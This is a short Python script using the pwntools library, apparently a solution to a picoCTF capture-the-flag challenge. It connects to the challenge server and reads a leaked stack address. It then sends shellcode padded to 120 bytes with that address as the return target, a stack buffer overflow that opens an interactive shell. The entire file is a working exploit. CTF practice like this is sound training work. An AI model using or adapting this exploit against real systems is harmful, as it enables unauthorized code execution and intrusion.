from pwn import *

context.arch = 'amd64'
p = remote('wily-courier.picoctf.net', 55105)
local_addr = p.recvuntil(b'\n')
local_addr = int(local_addr, 16)
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (120 - len(shellcode)) + p64(local_addr)
p.sendline(b'Hello')
p.sendline(payload)

p.interactive()
